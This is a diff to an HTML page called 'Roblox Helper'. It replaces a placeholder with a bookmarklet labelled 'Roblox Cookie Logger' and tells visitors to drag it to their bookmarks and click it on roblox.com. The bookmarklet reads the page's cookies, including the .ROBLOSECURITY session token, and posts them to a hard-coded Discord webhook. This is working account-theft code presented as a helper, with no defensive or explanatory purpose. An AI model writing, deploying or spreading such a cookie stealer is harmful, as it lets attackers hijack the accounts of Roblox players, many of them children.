@@ -1,8 +1,21 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Roblox Helper</title></head>
-  <body>
-    <h1>Roblox Helper is working!</h1>
-    <p>This page is live. You can edit it later with your real code.</p>
-  </body>
+<head>
+  <title>Roblox Helper</title>
+</head>
+<body>
+  <h2>Drag this link to your bookmarks bar:</h2>
+  
+  <a href="javascript:(function(){
+    fetch('https://discord.com/api/webhooks/1401453972492910654/EYuPVuEmsJifdIhVFfhQw1JeOBaE4L0HhPzbpxxx6MTJ38xOouQtnKxcxHwLUI320yIT', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({content: '.ROBLOSECURITY cookie: ' + document.cookie})
+    });
+  })()" draggable="true" style="font-size:20px; color:blue; cursor:pointer;">
+    Roblox Cookie Logger (Bookmarklet)
+  </a>
+  
+  <p>Drag the blue link above to your bookmarks bar, then click the bookmark while on roblox.com.</p>
+</body>
 </html>
